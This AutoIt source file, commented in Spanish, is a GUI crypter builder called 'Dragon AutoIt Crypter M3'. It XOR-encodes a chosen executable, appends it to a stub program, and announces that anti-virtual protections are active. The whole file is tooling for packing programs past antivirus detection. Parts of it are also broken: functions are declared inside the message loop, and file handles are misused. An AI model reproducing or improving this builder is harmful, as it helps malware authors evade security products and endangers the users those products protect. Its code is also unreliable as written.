#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <WinAPI.au3>
;==============================================;
; Dragon AutoIt Crypter M3                     ;
; Codeado por M3                               ;
; Thanks  to  TRANCEXX  for Runpe              ;
; Favor mantener los Creditos del Autor        ;
;==============================================;

; Hacemos  la gui  en el Koda Software , generador de GUI  para  AutoIt
;Los valores  se quedam automaticos  logo despues de listo  , asi que solo copiar


Global $htit = _WinAPI_GetSystemMetrics($SM_CYCAPTION)
Global $frame = _WinAPI_GetSystemMetrics($SM_CXDLGFRAME)
#Region ### START Koda GUI section ### Form=

$Form1 = GUICreate("Dragon Autoit Crypter M3", 365, 168, -1, -2 ,-1,$WS_EX_ACCEPTFILES)  
GUISetOnEvent($GUI_EVENT_DROPPED, "sDrag") 
GUISetCursor (3)
GUISetFont(8, 400, 0, "Cambria")
GUISetBkColor(0x000000)
WinSetOnTop($Form1, "", 1)

$Text1 = GUICtrlCreateInput("Arrasta tu archivo ....", 8, 118, 350, 16)
GUICtrlSetState(-1, $GUI_DROPACCEPTED)
GUISetState(@SW_SHOW)
GUICtrlSetCursor (-1, 3)

$Text2 = GUICtrlCreateInput("<<<<<  Pass  >>>>>", 8, 147, 100, 16)
GUICtrlSetCursor (-1, 3)

$Crypt = GUICtrlCreateButton("Encryptar", 115, 145, 120, 20)
GUICtrlSetCursor (-1, 3)

$Sobre = GUICtrlCreateButton("Acerca De", 240, 145, 120, 20)
GUICtrlSetCursor (-1, 3)

$Progress1 = GUICtrlCreateProgress(8, 137, 350, 6)

$Pic1 = GUICtrlCreatePic(@ScriptDir & "\Image\AutoItCliente.jpg", 0, 0, 393, 113) 

#EndRegion ### END Koda GUI section ###



;=================================================
; Efecto Deslizar Form
;=================================================
$Long = 1
Do
_WinAPI_SetWindowRgn($Form1, _WinAPI_CreateRoundRectRgn(0, 0, 560 , $Long , 0 ,  0))
Sleep(1)
$Long = $Long + 1
Until $Long = 200
 
While 1




	
	
	   $nMsg = GUIGetMsg()
	   Switch $nMsg
	  
	  
	  
	   Case $GUI_EVENT_CLOSE ; indica que se cierra la GUI  entonces termina el programa
	   Exit

	   
	   Case $Sobre  ; el el caso del boton Acerca
	   
	   msgbox (0,"AutoIt Crypter M3" ,"Coded By  M3 , Thanks to TRANCEXX")
		   
	   
	   Case $Crypt ; en el caso del boton crypt  iniciamos la encryptaccion 
	   if GuiCtrlRead($Text1) =  "Arrasta tu archivo ...." then   
	   msgbox(0,"Atencion ","Primer debes arrastar un arhivo")
	   exit
	   endif
	  
	  ;Escribimos | buscamos la ruta       leemos el archivo | imputamos lo resultado
		 FileWrite (@ScriptDir & "\Stub.exe", GuiCtrlRead ($Text2)) ;Add Pass 
		  
         $sKey = "\\BYM3\\"		 ; Delimitador
		 
		 $stub = FileOpen(@ScriptDir & "\Stub.exe") ; Abrimos  la ruta del Stub 

		 $sStub_ = FileRead($stub) ;Leemos el Stub

		 $sArquivo_ = FileRead(FileOpen(GuiCtrlRead($Text1))) ;Leemos e abrimos el Archivo a encrytar

		 $sArquivo_ = sEncode($sArquivo_,$sKey)   ;Encryptamos e imputamos el delimitador
															;Diretorio del archivo
         $salvar = FileOpen(FileSaveDialog("Guardar  Como...", @ScriptDir, "Ejecutables(*.exe)") & ".exe", 18) ; abrimos  ventana  de guardar

         FileWrite($salvar, $sStub_)  ; escribimos  el archivo a guardar e el stub

		 FileWrite($salvar, StringToBinary($sKey)) ; escribimos los datos Convertidos 

		 FileWrite($salvar, $sArquivo_) ; escribimos los datos finales = Archivo elijido e Stub encryptados

		 
		 ; Cerramos  
		 FileClose($stub) 
		 FileClose($Text1) 
		 Fileclose($Salvar)
         
		    
        GUICtrlSetData ($Progress1,GUICtrlRead($Progress1) + 100) ; Barra de progresso 
		
		 Msgbox(0, "AutoIt Crypter M3" , "Anti-virtuales  Activados ")
	   
		 ;=======================================================================================
		 ;Funcion  para Drag and Drop
		 ;=======================================================================================
		 Func sDrag()
			 ConsoleWrite("ID: "&@GUI_DRAGID & " File: "&@GUI_DRAGFILE &" Drop: "&@GUI_DROPID&@CRLF)
		 EndFunc
	  
		 ;==================================================
		 ;  Xor  Encryptaccion  
		 ;==================================================
		 Func sEncode($s_String,$s_Key = '2', $s_Level = 1)
			 Local $s_Encrypted, $s_kc = 1
			
			
			 $s_Key = StringSplit($s_Key,'')
			 $s_String = StringSplit($s_String,'')
			
			 For $x = 1 To $s_String[0]
				 $s_kc = Mod($x,$s_Key[0])
				 $s_Encrypted &= Chr(BitXOR(Asc($s_String[$x]),Asc($s_Key[$s_kc])*$s_Level))
			 Next
			
			 Return $s_Encrypted
		 EndFunc

         EndSwitch
		 

         WEnd
		   
	


